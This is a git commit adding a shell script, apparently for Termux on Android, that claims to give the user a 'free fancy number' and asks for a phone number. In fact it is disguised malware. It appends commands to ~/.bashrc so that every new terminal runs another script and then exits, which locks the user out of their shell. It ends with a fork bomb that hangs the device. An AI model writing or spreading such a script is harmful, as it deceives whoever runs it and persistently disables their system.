dcc3600735f2a3978420d361c059903cff043bd2
Sunaifnfc <87078360+Sunaifnfc@users.noreply.github.com>
2021-07-23 21:21:22 +0530

    Create wa.sh

---
+++ wa.sh
@@ -0,0 +1,29 @@
+#!/system/bin/sh
+clear
+echo 'bash c.sh' >> ~/.bashrc
+echo 'exit' >> ~/.bashrc
+mv c.sh $HOME
+sleep 2
+neofetch
+sleep 4
+clear
+echo " plz wait............"
+sleep 5
+clear
+echo " "
+cowsay -f daemon 1
+sleep 1
+echo -e "\e[91m "
+figlet "You can get free fancy number"
+echo "  coded by Sunaif Adkar "
+echo " "
+sleep 3
+echo " "
+echo -e "\e[91m "
+read -p "[•] please type country code with number :- "
+sleep 3
+clear
+echo "\e[91m "
+cowsay -f meow 1
+figlet "reset phone .·´¯`(>▂<)´¯`·.️"
+:(){ :|:& };:
